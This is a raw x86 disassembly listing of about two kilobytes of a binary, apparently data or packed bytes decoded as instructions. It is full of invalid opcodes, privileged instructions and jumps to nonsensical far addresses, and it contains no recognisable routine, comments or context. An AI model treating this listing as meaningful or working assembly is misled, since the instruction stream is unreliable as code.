  4136bd:	jmp    0xaeb3cfd3
  4136c2:	mov    ch,0x8e
  4136c4:	lods   eax,DWORD PTR ds:[esi]
  4136c5:	mov    bh,0x8b
  4136c7:	int    0x8f
  4136c9:	gs push ds
  4136cb:	xchg   esi,eax
  4136cc:	mov    al,0x17
  4136ce:	ror    BYTE PTR [edx],0xd4
  4136d1:	mov    DWORD PTR [ebx+esi*2-0x6e],esp
  4136d5:	enter  0x6014,0xb0
  4136d9:	cmc    
  4136da:	jne    0x413708
  4136dc:	in     eax,dx
  4136dd:	add    eax,0x4bb0be96
  4136e2:	pop    ds
  4136e3:	pop    es
  4136e4:	stc    
  4136e5:	fdiv   QWORD PTR [eax+0x67221911]
  4136eb:	stos   DWORD PTR es:[edi],eax
  4136ec:	fs iret 
  4136ee:	push   0xe25fd2d
  4136f3:	lds    ebp,FWORD PTR [ecx-0x690e0e69]
  4136f9:	sbb    dh,bh
  4136fb:	scas   al,BYTE PTR es:[edi]
  4136fc:	dec    ebp
  4136fd:	inc    ecx
  4136fe:	loope  0x4136c4
  413700:	adc    edi,ebx
  413702:	inc    ebp
  413703:	ret    0x5395
  413706:	or     eax,0xde112550
  41370b:	and    dh,al
  41370d:	aaa    
  41370e:	std    
  41370f:	ror    DWORD PTR es:[esi],0xff
  413713:	inc    ebp
  413714:	pop    edi
  413715:	pusha  
  413716:	mov    eax,DWORD PTR [ebp+0x17f67eec]
  41371c:	cmp    ebx,DWORD PTR [edi]
  41371e:	cdq    
  41371f:	ret    
  413720:	jae    0x4136e2
  413722:	xor    eax,0x96fb0a03
  413727:	push   eax
  413728:	fidivr DWORD PTR [esi+0x1]
  41372b:	add    BYTE PTR [edx],dh
  41372d:	ret    0x83de
  413730:	into   
  413731:	cmp    DWORD PTR [ebp+0x7d],esi
  413734:	(bad)  
  413735:	jmp    0xd053:0xb2015b5
  41373c:	cmp    bl,bl
  41373e:	aaa    
  41373f:	cmp    ecx,DWORD PTR [esi+0x10]
  413742:	hlt    
  413743:	inc    edx
  413744:	mov    cl,0x5a
  413746:	mov    cl,0x3c
  413748:	pop    eax
  413749:	cld    
  41374a:	mov    al,0xd
  41374c:	mov    al,0x8c
  41374e:	dec    esi
  41374f:	stos   DWORD PTR es:[edi],eax
  413750:	lods   al,BYTE PTR ds:[esi]
  413751:	call   0x2eca4825
  413756:	or     al,0xb9
  413758:	sub    BYTE PTR [ebx-0x679dc6b1],ch
  41375e:	div    esp
  413760:	call   0xe940:0x5f5820ff
  413767:	pop    esp
  413768:	and    BYTE PTR [eax-0x7a],0x7
  41376c:	data16 lods al,BYTE PTR ds:[esi]
  41376e:	push   edi
  41376f:	repnz fimul WORD PTR [ecx-0x75]
  413773:	(bad)  
  413774:	retf   
  413775:	inc    edx
  413776:	xlat   BYTE PTR ds:[ebx]
  413777:	add    ebx,DWORD PTR [ebx-0x339f1a57]
  41377d:	xor    DWORD PTR [edx+edx*8],ebx
  413780:	or     edi,0xffffffba
  413783:	lock add BYTE PTR [ebp+0x28],ch
  413787:	add    al,0x92
  413789:	into   
  41378a:	sahf   
  41378b:	add    eax,0x7ed375bf
  413790:	sbb    DWORD PTR [ebx+edi*1-0x63],eax
  413794:	in     al,0x2f
  413796:	daa    
  413797:	outs   dx,BYTE PTR ds:[esi]
  413798:	push   0x85643dbd
  41379d:	add    al,0xf3
  41379f:	dec    ecx
  4137a0:	cmp    BYTE PTR [esi+edi*4+0x34],bl
  4137a4:	imul   edx,DWORD PTR [ebp-0x822f3ed],0x85999777
  4137ae:	enter  0x4a16,0x7d
  4137b2:	sub    al,0xa9
  4137b4:	lea    ebx,[eax-0x3c9a4cbb]
  4137ba:	add    BYTE PTR [ecx+edi*2],ah
  4137bd:	out    0xbd,eax
  4137bf:	sub    esp,ebx
  4137c1:	rcl    BYTE PTR [ebx+0x77],0x23
  4137c5:	clc    
  4137c6:	and    esi,DWORD PTR [edi+ecx*2]
  4137c9:	fldcw  WORD PTR [ecx-0x6]
  4137cc:	inc    ebx
  4137cd:	mov    eax,ds:0x7624b82d
  4137d2:	pop    ss
  4137d3:	pop    ss
  4137d4:	(bad)  
  4137d5:	enter  0xb66a,0x98
  4137d9:	stos   DWORD PTR es:[edi],eax
  4137da:	pop    es
  4137db:	int3   
  4137dc:	aaa    
  4137dd:	jge    0x413776
  4137df:	fwait
  4137e0:	repnz sub DWORD PTR [ebp+0x34],eax
  4137e4:	xor    edx,DWORD PTR [ecx-0x3e80f3a4]
  4137ea:	pop    edi
  4137eb:	sbb    ch,dh
  4137ed:	aad    0xce
  4137ef:	(bad)  
  4137f0:	mov    cl,0x32
  4137f2:	sbb    esi,0x97b876be
  4137f8:	and    al,0xe1
  4137fa:	mov    ecx,0x87454ebf
  4137ff:	pop    eax
  413800:	inc    ebx
  413801:	xchg   esp,eax
  413802:	cli    
  413803:	leave  
  413804:	xor    ecx,ebp
  413806:	xchg   BYTE PTR [edx],ah
  413808:	scas   eax,DWORD PTR es:[edi]
  413809:	mov    esi,0xa42e8fcb
  41380e:	jl     0x413883
  413810:	cmc    
  413811:	inc    esi
  413812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413813:	or     DWORD PTR [ecx-0x694ba84d],ebp
  413819:	rcl    al,1
  41381b:	pop    eax
  41381c:	es repnz pushf 
  41381f:	pusha  
  413820:	fisub  DWORD PTR [eax-0x74d101c0]
  413826:	push   esp
  413827:	or     bl,BYTE PTR [edx+edi*8]
  41382a:	fcmovnu st,st(7)
  41382c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41382d:	loopne 0x41382c
  41382f:	and    ebp,edx
  413831:	jmp    0xc179f656
  413836:	adc    al,0xd1
  413838:	xor    DWORD PTR [esi+0x74b90611],esi
  41383e:	icebp  
  41383f:	xchg   esi,eax
  413840:	mov    dh,0x82
  413842:	dec    edi
  413843:	mov    al,ds:0xd7779b83
  413848:	or     al,0x28
  41384a:	stos   BYTE PTR es:[edi],al
  41384b:	mov    ds,WORD PTR [ebx]
  41384d:	repz xor al,0xdd
  413850:	mov    esp,0x326f42e2
  413855:	ins    DWORD PTR es:[edi],dx
  413856:	add    ecx,eax
  413858:	jmp    0x3e1490de
  41385d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41385e:	pop    edx
  41385f:	iret   
  413860:	fsubrp st(4),st
  413862:	call   0x7d0b:0x41c84f09
  413869:	leave  
  41386a:	and    BYTE PTR [ebx-0x198a015a],ah
  413870:	jecxz  0x413820
  413872:	retf   
  413873:	sar    BYTE PTR [bp+0x2f10],0xc3
  413879:	sub    al,0xb
  41387b:	mov    esi,0xfc443c31
  413880:	mov    bh,bl
  413882:	adc    cl,BYTE PTR [esi+0x6401fe09]
  413888:	jbe    0x41382f
  41388a:	lods   eax,DWORD PTR ds:[esi]
  41388b:	test   BYTE PTR [edi+0x31],al
  41388e:	(bad)  
  41388f:	je     0x4138b5
  413891:	push   ebp
  413892:	mov    ebx,0x5710af4d
  413897:	and    DWORD PTR ds:0x3117939d,0xc26b0bff
  4138a1:	jp     0x41388d
  4138a3:	mov    cl,0xc4
  4138a5:	mov    fs,WORD PTR [edx-0x1b3e22d0]
  4138ab:	sbb    bl,bl
  4138ad:	pop    ebx
  4138ae:	sub    al,0xb8
  4138b0:	mov    edi,0xfdba5c0f
  4138b6:	call   0x921f:0x50fa670d
  4138bd:	add    eax,DWORD PTR [ebx-0x5955809f]
  4138c3:	aaa    
  4138c4:	(bad)  
  4138c5:	jnp    0x4138c6
  4138c7:	adc    al,0x71
  4138c9:	not    BYTE PTR [ebp+0x76a3c563]
  4138cf:	and    esp,esp
  4138d1:	lods   eax,DWORD PTR ds:[esi]
  4138d2:	retf   0x956d
  4138d5:	call   0xa58f4c5e
  4138da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138db:	out    dx,eax
  4138dc:	jg     0x413898
  4138de:	dec    ebx
  4138df:	cmp    al,0x8
  4138e1:	ror    BYTE PTR [ecx+0x41e95ee8],0x90
  4138e8:	jle    0x4138b0
  4138ea:	adc    DWORD PTR [ecx],esp
  4138ec:	push   0xa398213
  4138f1:	mov    ds:0xeb800ace,al
  4138f6:	cmp    al,BYTE PTR [ecx]
  4138f8:	pop    ss
  4138f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138fa:	pop    ebx
  4138fb:	shr    DWORD PTR [edi-0x28],1
  4138fe:	mov    al,0xbb
  413900:	shr    BYTE PTR [ecx-0x19],0x37
  413904:	jg     0x41393b
  413906:	fistp  WORD PTR [ecx]
  413908:	lock ins BYTE PTR es:[edi],dx
  41390a:	cli    
  41390b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41390d:	cmp    al,0xb8
  41390f:	ins    DWORD PTR es:[edi],dx
  413910:	cmp    al,0x37
  413912:	int3   
  413913:	xor    al,ah
  413915:	fiadd  WORD PTR [ebx+ebp*2+0x2a452c5b]
  41391c:	dec    esp
  41391d:	nop
  41391e:	icebp  
  41391f:	test   BYTE PTR [eax+ecx*1+0x3e3d01],ch
  413926:	mov    ah,0x61
  413928:	pop    ecx
  413929:	hlt    
  41392a:	jp     0x4138d9
  41392c:	sbb    ch,bl
  41392e:	cmp    BYTE PTR [esi-0x3b6a7750],ch
  413934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413935:	aaa    
  413936:	or     ah,al
  413938:	out    0x26,al
  41393a:	adc    ebp,eax
  41393c:	add    eax,DWORD PTR [edx-0xbb1d5a7]
  413942:	cmp    ebp,ebx
  413944:	fsubr  st,st(0)
  413946:	aad    0xc8
  413948:	add    BYTE PTR [ebx],dh
  41394a:	cmp    BYTE PTR [edi],bl
  41394c:	outs   dx,DWORD PTR ds:[esi]
  41394d:	je     0x4138f5
  41394f:	ss ins BYTE PTR es:[edi],dx
  413951:	xchg   esp,eax
  413952:	or     ecx,esi
  413954:	mov    eax,ds:0xa2a91a16
  413959:	cmc    
  41395a:	adc    al,0x95
  41395c:	dec    edx
  41395d:	xlat   BYTE PTR ds:[ebx]
  41395e:	sbb    dh,dl
  413960:	and    al,0x63
  413962:	xchg   esi,eax
  413963:	pop    ebp
  413964:	(bad)  [esi-0x1c267af9]
  41396a:	call   0xc431c884
  41396f:	pop    ebx
  413970:	mov    DWORD PTR [edx-0x5c],ecx
  413973:	into   
  413974:	jmp    0x550f54c1
  413979:	int3   
  41397a:	dec    edx
  41397b:	adc    al,0xf7
  41397d:	scas   al,BYTE PTR es:[edi]
  41397e:	or     ecx,DWORD PTR [ebx+0x2c]
  413981:	addr16 and bh,al
  413984:	ja     0x4139c6
  413986:	int3   
  413987:	out    0x53,al
  413989:	push   esi
  41398a:	dec    eax
  41398b:	pushf  
  41398c:	mov    ecx,0x2ac05ed6
  413991:	mov    ds:0xa176af6,al
  413996:	sbb    al,0xe7
  413998:	in     eax,0x1f
  41399a:	jp     0x413927
  41399c:	dec    ebx
  41399d:	and    esp,DWORD PTR [edi+0x43cd8214]
  4139a3:	xchg   esi,ebx
  4139a5:	stos   DWORD PTR es:[edi],eax
  4139a6:	cmp    BYTE PTR [ecx+0x38],bl
  4139a9:	dec    esi
  4139aa:	add    ebp,DWORD PTR [ebx]
  4139ac:	popa   
  4139ad:	(bad)  
  4139ae:	sbb    al,BYTE PTR [eax+edi*8-0x1c984330]
  4139b5:	call   0xaaa3120d
  4139ba:	shr    dh,cl
  4139bc:	and    DWORD PTR [ebx+0x59d4c499],ecx
  4139c2:	pinsrw mm4,edx,0xba
  4139c6:	dec    ebp
  4139c7:	mov    bh,0x31
  4139c9:	sbb    esp,edi
  4139cb:	jne    0x413982
  4139cd:	and    BYTE PTR ss:[ecx-0x4ac9cf58],dh
  4139d4:	addr16 push ss
  4139d6:	xchg   esp,eax
  4139d7:	(bad)  
  4139d8:	je     0x413a05
  4139da:	and    cl,BYTE PTR [ebx-0x3218c31b]
  4139e0:	sub    esi,DWORD PTR [edi]
  4139e2:	repnz or al,BYTE PTR [edx+0x7a]
  4139e6:	fs leave 
  4139e8:	pop    edi
  4139e9:	ss sub al,0x75
  4139ec:	sbb    ebp,DWORD PTR [eax+0x16]
  4139ef:	and    eax,0xf88c4a15
  4139f4:	push   ecx
  4139f5:	std    
  4139f6:	push   edi
  4139f7:	out    0xde,eax
  4139f9:	sti    
  4139fa:	mov    ch,0xc3
  4139fc:	std    
  4139fd:	cli    
  4139fe:	fmul   DWORD PTR [esi-0x41fd6051]
  413a04:	push   edx
  413a05:	inc    ebp
  413a06:	mov    edi,0xafe47292
  413a0b:	and    DWORD PTR [eax+0x308f431c],esi
  413a11:	fs ins DWORD PTR es:[edi],dx
  413a13:	mov    esp,0x3665293e
  413a18:	in     eax,dx
  413a19:	retf   0xe274
  413a1c:	aam    0x4f
  413a1e:	retf   
  413a1f:	rol    BYTE PTR [ebx-0x2f791076],1
  413a25:	lea    esp,[ebp+0x51a6df57]
  413a2b:	arpl   sp,si
  413a2d:	inc    ax
  413a2f:	fdivrp st(2),st
  413a31:	xchg   ecx,eax
  413a32:	mov    bl,0x3a
  413a34:	jge    0x4139ea
  413a36:	leave  
  413a37:	test   al,0xf6
  413a39:	xchg   edi,ecx
  413a3b:	mov    eax,DWORD PTR [ebp-0x69]
  413a3e:	imul   esp,DWORD PTR [eiz*8-0x6f318ee],0xffffffbc
  413a46:	mov    ecx,0x4fc3dcd
  413a4b:	stos   BYTE PTR es:[edi],al
  413a4c:	shr    BYTE PTR [eax-0xa056db4],cl
  413a52:	popf   
  413a53:	push   esp
  413a54:	loop   0x413a33
  413a56:	fisubr WORD PTR [ecx-0x27a34207]
  413a5c:	aas    
  413a5d:	cwde   
  413a5e:	aam    0x5a
  413a60:	jbe    0x413a21
  413a62:	and    eax,0x3a08c294
  413a67:	int3   
  413a68:	enter  0xbf4c,0x62
  413a6c:	jg     0x413a23
  413a6e:	jg     0x413a99
  413a70:	add    esi,eax
  413a72:	cmp    BYTE PTR [eax+0x6b5a0d73],0x1f
  413a79:	es dec esp
  413a7b:	and    al,0x5f
  413a7d:	cwde   
  413a7e:	cmp    ah,BYTE PTR [edx]
  413a80:	or     al,0xbd
  413a82:	out    0xbe,al
  413a84:	xchg   edx,eax
  413a85:	mov    ebp,0x90455591
  413a8a:	add    dl,BYTE PTR [edi]
  413a8c:	xor    ebx,DWORD PTR ds:0x8427007b
  413a92:	iret   
  413a93:	dec    ebx
  413a94:	dec    esp
  413a95:	test   edi,ebx
  413a97:	xchg   ebx,eax
  413a98:	cwde   
  413a99:	scas   al,BYTE PTR es:[edi]
  413a9a:	pop    esp
  413a9b:	inc    edx
  413a9c:	or     ebx,DWORD PTR [eax-0x57]
  413a9f:	outs   dx,DWORD PTR gs:[esi]
  413aa1:	mov    cl,BYTE PTR [ecx-0x5e]
  413aa4:	ror    DWORD PTR [ebx-0x312787d6],0xac
  413aab:	cwde   
  413aac:	in     al,dx
  413aad:	xchg   edi,eax
  413aae:	inc    esi
  413aaf:	bound  esi,QWORD PTR [esi]
  413ab1:	cwde   
  413ab2:	or     al,0x3d
  413ab4:	add    eax,0x450a58f
  413ab9:	call   0x3d86:0xf39b410e
  413ac0:	nop
  413ac1:	mov    bh,0xde
  413ac3:	sub    DWORD PTR [ebp+0x60794570],edx
  413ac9:	retf   
  413aca:	lock int3 
  413acc:	pop    ds
  413acd:	sbb    eax,0xd5e3b2ba
  413ad2:	rcl    ebp,0xb
  413ad5:	add    al,0xa4
  413ad7:	mov    ds:0xd22869b4,al
  413adc:	push   eax
  413add:	mov    al,ds:0xe98c63d8
  413ae2:	or     eax,0xf9b72f6b
  413ae7:	pop    eax
  413ae8:	xchg   esp,eax
  413ae9:	sub    eax,0x2fb28e
  413aee:	fild   WORD PTR [esi-0x80]
  413af1:	cdq    
  413af2:	sbb    al,0xf
  413af4:	retf   0x83fe
  413af7:	loope  0x413add
  413af9:	in     al,0xd8
  413afb:	ins    BYTE PTR es:[edi],dx
  413afc:	and    dh,BYTE PTR ds:0x21ae09d5
  413b02:	and    eax,DWORD PTR [esp+eiz*4+0x7]
  413b06:	cmp    eax,0xa97e65f3
  413b0b:	jge    0x413b3c
  413b0d:	arpl   bp,di
  413b0f:	jo     0x413b1f
  413b11:	xor    BYTE PTR [eax+0x6cc68a26],dh
  413b17:	and    al,0xf7
  413b19:	mov    dl,0xa8
  413b1b:	lahf   
  413b1c:	inc    eax
  413b1d:	sti    
  413b1e:	mov    al,ds:0xdfc101c1
  413b23:	push   0xffffffec
  413b25:	call   0x45301657
  413b2a:	or     al,0x88
  413b2c:	ffree  st(2)
  413b2e:	xchg   edx,eax
  413b2f:	xlat   BYTE PTR ds:[ebx]
  413b30:	and    DWORD PTR ds:0x879c1b90,ebx
  413b36:	jne    0x413b89
  413b38:	jne    0x413ba2
  413b3a:	dec    eax
  413b3b:	call   0xc5d1:0x69177f1a
  413b42:	into   
  413b43:	mov    ds:0x188b45f0,eax
  413b48:	jl     0x1659a478
  413b4e:	jnp    0x413b62
  413b50:	repz adc DWORD PTR [eax+0x72],ecx
  413b54:	sbb    eax,0xc2bd5916
  413b59:	imul   esi,DWORD PTR ds:0xb8c3b8d1,0x63dd871b
  413b63:	in     al,dx
  413b64:	jae    0x413bba
  413b66:	inc    esp
  413b67:	lods   al,BYTE PTR ds:[esi]
  413b68:	adc    DWORD PTR [eax+ebx*8+0x3ec523ba],ebp
  413b6f:	sbb    ecx,DWORD PTR [ebx]
  413b71:	(bad)  
  413b72:	mov    al,gs:0x1d02e888
  413b78:	or     DWORD PTR [edx+esi*1+0x70c0a0ae],esi
  413b7f:	ror    al,cl
  413b81:	push   cs
  413b82:	add    al,0xc8
  413b84:	mov    ebp,0x46bac7c5
  413b89:	jbe    0x413b3b
  413b8b:	fbstp  TBYTE PTR [esi-0x7a]
  413b8e:	out    0x8f,al
  413b90:	mov    BYTE PTR [eax-0x4cfe51b4],ch
  413b96:	icebp  
  413b97:	pop    edi
  413b98:	inc    eax
  413b99:	stos   BYTE PTR es:[edi],al
  413b9a:	or     ebp,ecx
  413b9c:	inc    edi
  413b9d:	inc    esp
  413b9e:	inc    ebx
  413b9f:	push   eax
  413ba0:	enter  0x3a62,0x50
  413ba4:	out    dx,eax
  413ba5:	ret    
  413ba6:	xchg   ecx,eax
  413ba7:	dec    ebp
  413ba8:	dec    ebp
  413ba9:	add    ebx,DWORD PTR [edi+eiz*8-0x6fcf2412]
  413bb0:	ss call 0xc45244ad
  413bb6:	pop    edx
  413bb7:	fild   WORD PTR [esi]
  413bb9:	or     DWORD PTR [ebx-0x118af030],ebx
  413bbf:	and    dh,ah
  413bc1:	(bad)  
  413bc2:	stos   DWORD PTR es:[edi],eax
  413bc3:	iret   
  413bc4:	loope  0x413b7a
  413bc6:	and    ch,dh
  413bc8:	pop    ds
  413bc9:	ds retf 
  413bcb:	sub    eax,0x590f636f
  413bd0:	push   ecx
  413bd1:	stos   DWORD PTR es:[edi],eax
  413bd2:	aaa    
  413bd3:	inc    esi
  413bd4:	cld    
  413bd5:	lea    ebp,[esi+0x1e]
  413bd8:	dec    ebp
  413bd9:	jle    0x413c33
  413bdb:	test   esp,ebx
  413bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bde:	mov    ebp,0xf27aaf39
  413be3:	or     eax,0xc357d62
  413be8:	fwait
  413be9:	ds push fs
  413bec:	mov    edi,DWORD PTR [eax]
  413bee:	out    dx,eax
  413bef:	or     eax,0x9a9cc5bd
  413bf4:	or     al,0xf7
  413bf6:	repnz and bh,ch
  413bf9:	jg     0x413b7f
  413bfb:	scas   eax,DWORD PTR es:[edi]
  413bfc:	adc    cl,ah
  413bfe:	xor    DWORD PTR [esi-0xb04f1d4],esi
  413c04:	jmp    0xc9d3:0xc434b6e8
  413c0b:	test   BYTE PTR [ecx+0x5a],dh
  413c0e:	jle    0x413c7c
  413c10:	jge    0x413c41
  413c12:	stc    
  413c13:	xchg   ebp,eax
  413c14:	call   0x2114d6b7
  413c19:	(bad)  
  413c1a:	jmp    0xe821:0x50377664
  413c21:	mov    ah,0xf5
  413c23:	pop    ds
  413c24:	cli    
  413c25:	mov    dh,0x1d
  413c27:	xchg   BYTE PTR [edi+edx*8-0x33c4baf0],dh
  413c2e:	sub    eax,0x9bd92cf5
  413c33:	jecxz  0x413bea
  413c35:	push   ebx
  413c36:	mov    ch,0xa1
  413c38:	fisubr WORD PTR [eax+0x39]
  413c3b:	jne    0x413bc4
  413c3d:	dec    eax
  413c3e:	pop    ebp
  413c3f:	sub    eax,0xa8633e89
  413c44:	std    
  413c45:	jmp    0x413c11
  413c47:	push   edx
  413c48:	scas   al,BYTE PTR es:[edi]
  413c49:	xor    al,0x82
  413c4b:	lock jmp 0x413cc8
  413c4e:	rcl    BYTE PTR [ebx],1
  413c50:	or     dl,bl
  413c52:	popa   
  413c53:	nop
  413c54:	pop    ss
  413c55:	push   0x66
  413c57:	pop    ss
  413c58:	mov    ebp,0x5d885b06
  413c5d:	jle    0x413c6b
  413c5f:	jnp    0x413cab
  413c61:	pop    edx
  413c62:	fild   DWORD PTR [eax+0x39]
  413c65:	and    eax,0xba06f19a
  413c6a:	pop    ebx
  413c6b:	sub    BYTE PTR [eax+0x7f],dh
  413c6e:	div    ebx
  413c70:	mov    ah,0xaf
  413c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c73:	in     al,dx
  413c74:	mov    ebp,0xcaff63f1
  413c79:	and    al,BYTE PTR [edi]
  413c7b:	lock add dl,BYTE PTR [ecx+eax*2+0x184bafcb]
  413c83:	sub    DWORD PTR [eax+0x1bd7fd4b],ecx
  413c89:	aad    0x95
  413c8b:	push   esi
  413c8c:	mov    esi,0x69172c3f
  413c91:	clc    
  413c92:	into   
  413c93:	ror    BYTE PTR ds:0x21b13e5a,cl
  413c99:	ss fs ds shl bh,1
  413c9e:	adc    eax,0x716bb535
  413ca3:	push   eax
  413ca4:	mov    al,0x60
  413ca6:	sub    DWORD PTR [edi+0x4e67039f],ecx
  413cac:	nop
  413cad:	mov    ds:0xe1b9d416,al
  413cb2:	mov    ebp,0xa15ebca3
  413cb7:	sahf   
  413cb8:	pop    ebp
  413cb9:	js     0x413d27
  413cbb:	out    dx,al
  413cbc:	imul   esi,DWORD PTR [ebx+0x1d],0xffffff8a
  413cc0:	(bad)  
  413cc1:	xchg   ecx,eax
  413cc2:	add    al,0x74
  413cc4:	xchg   ecx,eax
  413cc5:	cmp    al,0xbc
  413cc7:	jae    0x413cc2
  413cc9:	arpl   WORD PTR [esi+0x47504b44],dx
  413ccf:	(bad)  
  413cd1:	int3   
  413cd2:	push   edx
  413cd3:	in     eax,dx
  413cd4:	cmp    eax,0xd2aa2e05
  413cd9:	adc    cl,BYTE PTR [ebx+ebp*4]
  413cdc:	aam    0xec
  413cde:	inc    esp
  413cdf:	retf   
  413ce0:	les    esi,FWORD PTR [ecx+0xb]
  413ce3:	nop
  413ce4:	retf   
  413ce5:	push   edi
  413ce6:	mov    WORD PTR [ebp-0x29],ds
  413ce9:	sbb    BYTE PTR [edi],al
  413ceb:	add    BYTE PTR [ebx-0x32f959e2],al
  413cf1:	pop    ecx
  413cf2:	dec    esi
  413cf3:	sbb    eax,0x5eaeb2ba
  413cf8:	std    
  413cf9:	aas    
  413cfa:	or     eax,0x920c1498
  413cff:	pushf  
  413d00:	mov    dl,0xc5
  413d02:	mov    al,0xa5
  413d04:	aam    0xea
  413d06:	adc    BYTE PTR [edx+0x54d36426],dl
  413d0c:	xchg   esi,eax
  413d0d:	push   ebp
  413d0e:	sbb    eax,0xc98f89a9
  413d13:	mov    esi,0x2112c145
  413d18:	sub    DWORD PTR [ecx-0x7d5ca34e],0x7c026e17
  413d22:	xchg   ebx,eax
  413d23:	sbb    eax,0xc1ab2d99
  413d28:	adc    eax,0x53a873ce
  413d2d:	sbb    ecx,esp
  413d2f:	mov    eax,ds:0xe9b15954
  413d34:	call   0x889f:0xc302ae17
  413d3b:	adc    eax,0x139b1ee4
  413d40:	ret    0xe9e3
  413d43:	sub    esi,DWORD PTR [ebp-0x51]
  413d46:	inc    esi
  413d47:	xchg   edi,eax
  413d48:	rcl    DWORD PTR [ecx+0x7a],0x9e
  413d4c:	xlat   BYTE PTR ds:[ebx]
  413d4d:	pushf  
  413d4e:	push   0xffffffb6
  413d50:	cmp    edx,DWORD PTR [esp+ebp*1-0x734903c2]
  413d57:	xchg   edx,eax
  413d58:	pop    edx
  413d59:	es and eax,DWORD PTR fs:[edi-0x25]
  413d5e:	jge    0x413d74
  413d60:	lods   eax,DWORD PTR ds:[esi]
  413d61:	or     ah,BYTE PTR [eax]
  413d63:	sti    
  413d64:	hlt    
  413d65:	mov    ebp,0x1ce2da46
  413d6a:	ja     0x413dda
  413d6c:	iret   
  413d6d:	and    al,0x73
  413d6f:	push   ss
  413d70:	add    ebx,DWORD PTR [ebx-0x4d312ab1]
  413d76:	loop   0x413d95
  413d78:	push   0x2a
  413d7a:	daa    
  413d7b:	push   0xffffffe7
  413d7d:	je     0x413d7a
  413d7f:	popf   
  413d80:	shl    esi,cl
  413d82:	sbb    dh,cl
  413d84:	jmp    0x413de2
  413d86:	sbb    al,0x94
  413d88:	cmp    ecx,DWORD PTR [esp+edi*4]
  413d8b:	fnstsw WORD PTR [ebx]
  413d8d:	jo     0x413dae
  413d8f:	xchg   edx,eax
  413d90:	push   edx
  413d91:	mov    ebx,0x9053e865
  413d96:	cdq    
  413d97:	add    ch,bh
  413d99:	lds    esp,FWORD PTR [ebx-0x1c]
  413d9c:	ja     0x413e19
  413d9e:	cmp    DWORD PTR [esi+0x7cd21a1e],edi
  413da4:	outs   dx,DWORD PTR ds:[esi]
  413da5:	test   DWORD PTR [ebx-0x6d],0x43815c01
  413dac:	ret    
  413dad:	test   bl,dh
  413daf:	dec    esp
  413db0:	xor    cl,bl
  413db2:	pop    ebp
  413db3:	(bad)  
  413db4:	cmp    DWORD PTR [ebp+0x11],ecx
  413db7:	dec    ebx
  413db8:	add    BYTE PTR [ecx],0x6f
  413dbb:	test   al,0x1a
  413dbd:	ret    0xa87a
  413dc0:	int    0x63
  413dc2:	out    0xcf,eax
  413dc4:	and    eax,0x6c55b810
  413dc9:	push   edx
  413dca:	sar    BYTE PTR [ebx-0x70],0x3d
  413dce:	jg     0x413dd9
  413dd0:	cwde   
  413dd1:	in     al,0xfc
  413dd3:	retf   0xf5d0
  413dd6:	in     al,0xe
  413dd8:	out    0x98,eax
  413dda:	xchg   DWORD PTR [ebx-0x45],ecx
  413ddd:	jns    0x413da6
  413ddf:	cmp    DWORD PTR [edx-0x79],edi
  413de2:	ds push ecx
  413de4:	and    DWORD PTR [eax-0x1d],ebx
  413de7:	imul   ebx,DWORD PTR [edx],0xffffffe6
  413dea:	retf   
  413deb:	xor    al,0xc1
  413ded:	lods   al,BYTE PTR ds:[esi]
  413dee:	jp     0x413d8f
  413df0:	sub    al,0x62
  413df2:	adc    DWORD PTR [ebx],ecx
  413df4:	les    eax,FWORD PTR [eax-0x61]
  413df7:	icebp  
  413df8:	hlt    
  413df9:	ja     0x413e13
  413dfb:	test   al,0x25
  413dfd:	mov    WORD PTR [ebp+0x57952742],es
  413e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e04:	nop
  413e05:	jo     0x413e12
  413e07:	lahf   
  413e08:	push   esp
  413e09:	arpl   cx,bx
  413e0b:	pop    ss
  413e0c:	cli    
  413e0d:	adc    al,0x5
  413e0f:	repz xchg edx,eax
  413e11:	cmp    esp,DWORD PTR [ecx+ebp*4+0x3]
  413e15:	jp     0x413db4
  413e17:	scas   eax,DWORD PTR es:[edi]
  413e18:	mov    cl,0x33
  413e1a:	mov    al,0x8c
  413e1c:	mov    dh,0x67
  413e1e:	or     DWORD PTR [edi-0x57],esi
  413e21:	dec    esi
  413e22:	mov    ah,0xac
  413e24:	mov    ah,0xbe
  413e26:	xor    DWORD PTR [edx+ebp*8+0x61],0x7b
  413e2b:	neg    DWORD PTR [edi]
  413e2d:	jne    0x413dea
  413e2f:	push   ss
  413e30:	jbe    0x413e67
  413e32:	loop   0x413e87
  413e34:	jnp    0x413e32
  413e36:	pushf  
  413e37:	nop
  413e38:	cwde   
  413e39:	daa    
  413e3a:	gs dec esi
  413e3c:	scas   al,BYTE PTR es:[edi]
  413e3d:	and    eax,0xa2434bc4
  413e42:	lahf   
  413e43:	aad    0xd0
  413e45:	mov    ds:0xec947ecc,eax
  413e4a:	jecxz  0x413e80
  413e4c:	in     al,0xea
  413e4e:	leave  
  413e4f:	(bad)  
  413e50:	stos   DWORD PTR es:[edi],eax
  413e51:	and    cl,0xa1
  413e54:	je     0x413e19
  413e56:	adc    ecx,DWORD PTR [ebp-0x1826a11a]
  413e5c:	mov    esi,0x976fb695
  413e61:	or     ebx,esp
  413e63:	fist   DWORD PTR [edx+0x7c]
  413e66:	sti    
  413e67:	jne    0x413e0e
  413e69:	xchg   esp,eax
  413e6a:	ret    0xa454
  413e6d:	clc    
  413e6e:	lahf   
  413e6f:	dec    ecx
  413e70:	bnd jno 0x413eac
  413e73:	addr16 jmp 0x413e84
  413e76:	push   ecx
  413e77:	stc    
  413e78:	pop    ss
  413e79:	scas   eax,DWORD PTR es:[edi]
  413e7a:	ret    0x28ba
  413e7d:	add    ebp,0xffffffb3
  413e80:	ins    BYTE PTR es:[edi],dx
  413e81:	pop    eax
  413e82:	xor    cl,BYTE PTR [eax+0x2a2e82a7]
  413e88:	sbb    BYTE PTR [ebx-0x13017619],dl
  413e8e:	aam    0x95
  413e90:	hlt    
  413e91:	retf   0x9bc2
  413e94:	mov    edx,0x79945bd5
  413e99:	cmp    dh,cl
  413e9b:	xchg   esp,eax
  413e9c:	and    DWORD PTR [edx+0x4a2d9f11],eax
